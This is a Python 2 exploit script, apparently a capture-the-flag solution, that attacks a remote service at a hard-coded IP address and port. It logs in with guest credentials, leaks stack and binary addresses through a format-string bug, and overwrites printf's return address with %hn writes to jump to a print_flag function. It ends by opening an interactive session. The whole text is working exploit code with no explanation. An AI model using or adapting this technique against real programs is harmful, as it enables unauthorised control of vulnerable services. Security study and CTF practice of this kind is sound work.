#!/usr/bin/python
import operator
import struct
import socket
import telnetlib

def readuntil(f, delim=': '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('202.112.26.107', 10910))
f = s.makefile('rw', bufsize=0)

readuntil(f)
f.write('guest\n')
readuntil(f)
f.write('guest123\n')

readuntil(f)
f.write('2\n')
readuntil(f, ':\n')
f.write('A' * 256 + '\n')
readuntil(f)

f.write('4\n')
readuntil(f)
f.write('%74$p.%75$p.\n')
readuntil(f)
f.write('\n')

data = readuntil(f).split('.')
saved_rbp = int(data[0], 16)
printf_return_addr = saved_rbp - 0x18 - 8 - 0x220 - 8
binary_base = int(data[1], 16) - 0x12D3
print_flag = binary_base + 0xFB3
print 'binary_base =', hex(binary_base)
print 'saved_rbp =', hex(saved_rbp)

writes = {}

def write8(where, what):
    global writes
    writes[where] = what & 0xffff
    writes[where + 2] = (what >> 16) & 0xffff
    writes[where + 4] = (what >> 32) & 0xffff
    writes[where + 6] = (what >> 48) & 0xffff

write8(printf_return_addr, print_flag)

username = ''
password = ''
printed = 0
index = 40

for where, what in sorted(writes.items(), key=operator.itemgetter(1)):
    delta = (what - printed) & 0xffff

    if delta > 0:
        if delta < 8:
            username += 'A' * delta
        else:
            username += '%' + str(delta) + 'x'

    username += '%' + str(index) + '$hn'
    index += 1

    password += p(where)
    printed += delta

assert '\0' not in username
assert '\n' not in username
assert '\n' not in password
assert len(username) < 256
assert len(password) < 256

f.write(username + '\n')
readuntil(f)

f.write(password + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
